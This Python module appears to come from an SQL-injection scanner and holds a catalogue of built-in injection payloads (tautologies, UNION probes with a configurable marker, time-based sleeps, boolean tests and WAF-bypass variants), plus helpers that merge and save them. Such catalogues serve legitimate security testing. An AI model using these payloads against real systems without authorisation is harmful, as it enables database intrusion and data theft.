"""
scanner.payloads
~~~~~~~~~~~~~~~~

Built-in SQL-Injection payload catalogue **with config/CLI binding and
templated UNION marker**.

New in v1.1
-----------
* Accept a *marker* argument so UNION payloads embed any string the user
  configures (default: ``SQLISCANNERUNIONTEST``).
* Expose ``get_builtin_payloads(categories, marker)`` so ``utils.load_payloads``
  can seamlessly merge built-ins selected via YAML or ``--builtins`` CLI flag.

Public helpers
~~~~~~~~~~~~~~
- list_categories()
- get_builtin_payloads()
- save_builtin_payloads()
"""
from __future__ import annotations

import pathlib
from typing import Dict, Iterable, List

__all__ = [
    "DEFAULT_MARKER",
    "list_categories",
    "get_builtin_payloads",
    "save_builtin_payloads",
]

# --------------------------------------------------------------------------- #
# Constants
# --------------------------------------------------------------------------- #
DEFAULT_MARKER = "SQLISCANNERUNIONTEST"

# --------------------------------------------------------------------------- #
# Built-in payload catalogue
#   * Use {MARKER} placeholder inside UNION strings *
# --------------------------------------------------------------------------- #
_BUILTIN_PAYLOADS: Dict[str, List[str]] = {
    "classic": [
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR 1=1 --",
        "' OR 'a'='a",
        "') OR ('1'='1",
        "' OR '' = '",
    ],
    "union": [
        "' UNION SELECT NULL, '{MARKER}' -- ",
        "\" UNION SELECT \"{MARKER}\" -- ",
        "') UNION SELECT '{MARKER}' /*",
    ],
    "time": [
        "'; WAITFOR DELAY '0:0:10' --",
        "'; SELECT pg_sleep(10)--",
        "' OR SLEEP(10) -- ",
        "\" OR pg_sleep(10) -- ",
        "') OR SLEEP(10) /*",
    ],
    "boolean": [
        "' AND 1=1 --",
        "' AND 1=2 --",
        "\" AND 1=1 --",
        "\" AND 1=2 --",
    ],
    "waf-bypass": [
        "'/*!50000OR*/'1'/*!50000=*/='1",
        "' OR 1=1#",
        "' OR 1=1/**/",
        "' OR 1=1%00",
        "' OR 1=1-- -",
    ],
}

_DEFAULT_ORDER = ["classic", "union", "time", "boolean", "waf-bypass"]


# --------------------------------------------------------------------------- #
# Public helpers
# --------------------------------------------------------------------------- #
def list_categories() -> List[str]:
    """Return available built-in category names (sorted)."""
    return sorted(_BUILTIN_PAYLOADS)


def get_builtin_payloads(
    categories: Iterable[str] | None = None,
    *,
    marker: str = DEFAULT_MARKER,
) -> List[str]:
    """
    Return de-duplicated payloads for *categories* with {MARKER} substituted.

    Parameters
    ----------
    categories : iterable[str] | None
        Category names. ``None`` or empty ⇒ all default categories.
    marker : str, optional
        Unique string to embed in UNION payloads.

    Returns
    -------
    list[str]
    """
    if not categories:
        categories = _DEFAULT_ORDER

    seen: set[str] = set()
    aggregated: List[str] = []
    for cat in categories:
        group = _BUILTIN_PAYLOADS.get(cat)
        if not group:
            continue
        for p in group:
            payload = p.replace("{MARKER}", marker)
            if payload not in seen:
                seen.add(payload)
                aggregated.append(payload)
    return aggregated


def save_builtin_payloads(
    path: str | pathlib.Path,
    categories: Iterable[str] | None = None,
    *,
    marker: str = DEFAULT_MARKER,
) -> pathlib.Path:
    """
    Write selected built-ins to *path* (one per line) and return the ``Path``.
    """
    payloads = get_builtin_payloads(categories, marker=marker)
    p = pathlib.Path(path)
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text("\n".join(payloads) + "\n", encoding="utf-8")
    return p
